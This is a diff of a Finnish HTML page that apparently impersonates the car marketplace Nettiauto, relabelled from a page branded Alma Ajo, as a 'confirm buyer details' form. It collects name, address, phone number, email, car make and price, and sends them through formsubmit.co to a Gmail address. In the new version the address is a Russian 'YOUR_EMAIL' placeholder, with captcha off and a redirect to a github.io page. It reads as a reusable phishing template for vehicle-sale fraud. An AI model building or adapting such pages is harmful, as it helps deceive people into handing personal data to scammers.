@@ -1,31 +1,10 @@
 <!DOCTYPE html>
 <html lang="fi">
-<head> 
+<head>
 <meta charset="UTF-8">
-<title>Vahvista tietosi</title>
+<title>Vahvista ostajan tiedot</title>
 
 <style>
-    .na-header {
-    background: #ffffff;
-    border-bottom: 1px solid #e6e6e6;
-    height: 64px;
-    display: flex;
-    align-items: center;
-}
-
-.na-header-inner {
-    max-width: 1200px;
-    width: 100%;
-    margin: 0 auto;
-    padding: 0 20px;
-    display: flex;
-    align-items: center;
-}
-
-.na-logo {
-    height: 34px;
-}
-
 body {
     margin: 0;
     font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
@@ -33,17 +12,25 @@ body {
     color: #1a1a1a;
 }
 
-.header {
+/* HEADER */
+.na-header {
     background: #ffffff;
-    border-bottom: 1px solid #e0e0e0;
-    padding: 15px 0;
+    border-bottom: 1px solid #e6e6e6;
+    height: 64px;
+    display: flex;
+    align-items: center;
+}
+.na-header-inner {
+    max-width: 1200px;
+    width: 100%;
+    margin: 0 auto;
+    padding: 0 20px;
+}
+.na-logo {
+    height: 34px;
 }
 
-.header img {
-    height: 40px;
-    margin-left: 20px;
-}
-
+/* FORM CARD */
 .container {
     max-width: 520px;
     margin: 40px auto;
@@ -87,7 +74,7 @@ input:focus {
 
 button {
     width: 100%;
-    margin-top: 25px;
+    margin-top: 30px;
     padding: 14px;
     background-color: #0072ce;
     color: #ffffff;
@@ -114,13 +101,11 @@ button:hover {
 <body>
 
 <!-- HEADER -->
-<!-- HEADER -->
 <header class="na-header">
   <div class="na-header-inner">
-    <img src="logo.png" alt="Alma Ajo" class="na-logo">
+    <img src="logo.png" alt="Nettiauto" class="na-logo">
   </div>
 </header>
-
 
 <!-- FORM -->
 <div class="container">
@@ -130,18 +115,28 @@ button:hover {
         Täytä alla olevat tiedot viimeistelläksesi ajoneuvokaupan.
     </div>
 
-    <form action="https://formsubmit.co/kastalmero@gmail.com" method="POST">
+    <form action="https://formsubmit.co/ТВОЙ_EMAIL@gmail.com" method="POST">
 
-        <label>Etunimi</label>
-        <input type="text" name="Etunimi" required>
+        <label>Nimi</label>
+        <input type="text" name="Nimi" required>
 
-        <label>Sukunimi</label>
-        <input type="text" name="Sukunimi" required>
+        <label>Osoite</label>
+        <input type="text" name="Osoite" required>
+
+        <label>Puhelinnumero</label>
+        <input type="tel" name="Puhelin" required>
 
         <label>Sähköpostiosoite</label>
         <input type="email" name="Email" required>
 
-        <input type="hidden" name="_subject" value="Uusi Nettiauto vahvistus">
+        <label>Ajoneuvon merkki</label>
+        <input type="text" name="Auton merkki" required>
+
+        <label>Hinta (€)</label>
+        <input type="number" name="Hinta" required>
+
+        <!-- FormSubmit settings -->
+        <input type="hidden" name="_subject" value="Uusi ajoneuvokaupan vahvistus">
         <input type="hidden" name="_captcha" value="false">
         <input type="hidden" name="_next" value="https://alfredodefaro-ai.github.io/form/success.html">
 
@@ -149,7 +144,7 @@ button:hover {
     </form>
 
     <div class="notice">
-        Nettiauto käyttää tietoja ainoastaan kaupan vahvistamiseen.
+        Tietoja käytetään ainoastaan kaupan vahvistamiseen.
     </div>
 
 </div>
